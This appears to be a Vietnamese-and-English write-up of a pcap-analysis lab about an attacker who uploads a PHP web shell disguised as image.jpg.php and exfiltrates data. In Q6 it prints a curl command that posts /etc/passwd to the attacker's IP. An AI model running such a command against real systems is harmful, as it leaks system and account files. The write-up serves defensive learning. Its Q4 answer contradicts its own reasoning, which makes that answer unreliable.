#  WebStrike

> An anomaly was discovered within our company's intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.

> Tools: Wireshark

## Q1: Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?

+ attacker xác định qua conversations port của ip attacker là 117.11.88.124

  ![image](https://github.com/user-attachments/assets/7a13e7e8-83a4-43a5-974e-5095b29b656d)

=> xác định xong bên connect là attacker đến victim location ta sẽ check trên Internet protocol trên detail 

![image](https://github.com/user-attachments/assets/c79940d2-6a43-4b22-b2c6-2c23b44a70b0)

=> Anwser : city_Tianjin

## Q2: Knowing the attacker's user-agent assists in creating robust filtering rules. What's the attacker's user agent?

+ xác định user-agent là thông tin về browser của attacker ip ta cần check về thông tin gói tin HTTP get request

+ gói tin GET sẽ chứa dữ liệu của ip attacker source đang send request đến victim

  ![image](https://github.com/user-attachments/assets/02d4cec8-eede-4a93-9455-003b5c35f3ba)

=> ip attacker đang vào trang shoporoma với user-agent

=> Anwser: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

## Q3: We need to identify if there were potential vulnerabilities exploited. What's the name of the malicious web shell uploaded?

+ xác định tên web shell được upload lên hệ thống => ta cần tìm response trả về file upload

+ file upload thường sẽ sử dụng method post để upload file

![image](https://github.com/user-attachments/assets/352630a3-167c-4a2a-946c-b08c4b9f3b73)

=> ta có thể thấy file đã trả về upload successful nên ta có thể nhận định file name = image.jpg.php có thể nó bypass extension filter format 

=> Anwser: image.jpg.php 

## Q4: Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?

+ trong web thì thư mục sẽ được lưu trữ ở root directory cụ thể trên web server => /html/www

+ với file đã uploads ta có thể xác định nó lưu trữ ở mục /uploads/ nhưng ta cần phải check cả gói tin vì có thư mục cha đằng trước nó

  ![image](https://github.com/user-attachments/assets/1cf0a1e0-6d0c-45d2-8810-7017a3fca8ad)

=> path /reviews/uploads/image.jpg.php => /reviews/uploads/ đang lưu trữ image.jpg.php

=> Anwser: image.jpg.php 

## Q5: Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell? 

+ conversations cho ta thông tin về port 8080 đang chiếm nhiều lưu lượng gói tin nhất trong traffic

+ nhận định port 8080 thường là port dự phòng do attacker tạo ra để tránh phát hiện hệ thống giám sát trên các port thông thường và giảm xung đột

  ![image](https://github.com/user-attachments/assets/70024d7d-4de5-433a-9bf3-cc3b46ec81bf)

=> có vẻ sau khi uploads shell code attacker đã thực thi 1 số command trên port lắng nghe là 8080 

=> Anwser: 8080 

## Q6: Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?

+ qua Q5 ta thấy attacker đang cố gắng trích xuất ra file chứa thông tin về user của hệ thông bằng /etc/passwd

+ có thể attacker đang cố gắng lấy đi tệp tin đó bằng câu lệnh

      curl -X POST -d /etc/passwd http://117.11.88.124:443/

=> Anwser: passwd
